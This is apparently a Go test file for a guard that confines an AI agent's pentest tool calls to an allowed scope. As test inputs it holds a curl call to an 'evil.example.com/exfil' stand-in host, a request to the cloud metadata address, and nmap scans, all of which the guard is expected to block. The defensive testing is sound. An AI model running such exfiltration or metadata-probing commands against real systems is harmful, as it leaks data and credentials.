package guard

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
)

func TestElectronicFenceBlocksOutOfScopeTargetsAndAllowsInScope(t *testing.T) {
	rules, err := ParseFenceRules([]string{
		"10.10.0.0/16",
		"*.corp.local",
		"https://portal.internal:8443/api",
	})
	if err != nil {
		t.Fatalf("ParseFenceRules: %v", err)
	}

	g := New()
	g.SetFence(true, rules, "127.0.0.1:8788")

	// In-scope calls must pass (including proxy exemption).
	for _, allowed := range []struct {
		tool  string
		input string
	}{
		{"Bash", `{"command":"nmap -sV 10.10.5.12"}`},
		{"Bash", `{"command":"nmap -Pn 10.10.2.0/24"}`},
		{"Bash", `{"command":"curl -x http://127.0.0.1:8788 http://app.corp.local/health"}`},
		{"WebFetch", `{"url":"https://portal.internal:8443/api/v1/users"}`},
		{"list_task_checks", `{"task_id":"1"}`},
	} {
		block, msg, _ := g.Hooks().PreToolUse(context.Background(), allowed.tool, []byte(allowed.input))
		if block {
			t.Errorf("expected fence to allow %s %s, got block: %s", allowed.tool, allowed.input, msg)
		}
	}

	// Out-of-scope calls must be blocked deterministically.
	for _, blocked := range []struct {
		tool  string
		input string
	}{
		{"Bash", `{"command":"nmap -sV 10.20.0.5"}`},
		{"Bash", `{"command":"nmap -Pn 10.0.0.0/8"}`}, // broader CIDR than 10.10.0.0/16
		{"Bash", `{"command":"curl http://169.254.169.254/latest/meta-data/"}`},
		{"Bash", `{"command":"curl https://evil.example.com/exfil"}`},
		{"WebFetch", `{"url":"https://other.internal/admin"}`},
	} {
		block, msg, _ := g.Hooks().PreToolUse(context.Background(), blocked.tool, []byte(blocked.input))
		if !block || !strings.Contains(msg, "electronic fence") {
			t.Errorf("expected electronic fence block for %s %s, got block=%v msg=%q", blocked.tool, blocked.input, block, msg)
		}
	}

	// Redirect check must block 30x redirects outside the fence.
	if err := g.CheckURLAllowed("https://portal.internal:8443/api/items"); err != nil {
		t.Errorf("expected in-fence URL to pass CheckURLAllowed, got: %v", err)
	}
	if err := g.CheckURLAllowed("https://portal.internal:8443/other"); err == nil {
		t.Error("expected wrong URL path prefix to fail CheckURLAllowed")
	}
	if err := g.CheckURLAllowed("http://169.254.169.254/latest/meta-data"); err == nil {
		t.Error("expected metadata IP redirect to fail CheckURLAllowed")
	}

	// Target-only guard (planner / main agent) must enforce fence too.
	tg := NewTargetOnly(nil)
	tg.SetFence(true, rules)
	in, _ := json.Marshal(map[string]string{"url": "https://outside.example.com/"})
	if block, _, _ := tg.Hooks().PreToolUse(context.Background(), "WebFetch", in); !block {
		t.Fatal("expected targetOnly guard to enforce electronic fence")
	}
}
